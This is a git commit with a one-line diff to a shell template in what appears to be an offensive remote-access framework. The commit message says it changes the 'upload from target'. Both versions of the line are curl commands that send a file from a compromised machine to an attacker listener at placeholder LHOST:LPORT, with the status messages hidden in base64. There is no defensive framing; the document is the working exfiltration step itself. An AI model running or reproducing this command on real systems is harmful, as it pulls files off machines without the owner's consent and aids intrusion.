2fdd95c8116d443873c6ddc3581a5ce874d70fb0
Talismancer <talismancy@gmail.com>
2025-02-26 21:14:07 +1030

    Binaries downloaded properly
    Changed to --data-binary upload from target

--- Core/Utilities/Shell/download/http/src.sh
+++ Core/Utilities/Shell/download/http/src.sh
@@ -1,1 +1,1 @@
-src="*SRC*"; url="http://*LHOST*:*LPORT*/*TICKET*";dest="*DEST*"; ticket="*TICKET*"; ((curl -s -H "Destination-Path: $dest" -H "Ticket: $ticket" -F "file=@$src" $url) && echo U3VjY2VzcyEK | base64 -d) || echo Q29tbWFuZCBmYWlsZWQuCg== | base64 -d
+src="*SRC*"; url="http://*LHOST*:*LPORT*/*TICKET*";dest="*DEST*"; ticket="*TICKET*"; ((curl -s -H "Destination-Path: $dest" -H "Ticket: $ticket" --data-binary "@$src" $url) && echo U3VjY2VzcyEK | base64 -d) || echo Q29tbWFuZCBmYWlsZWQuCg== | base64 -d
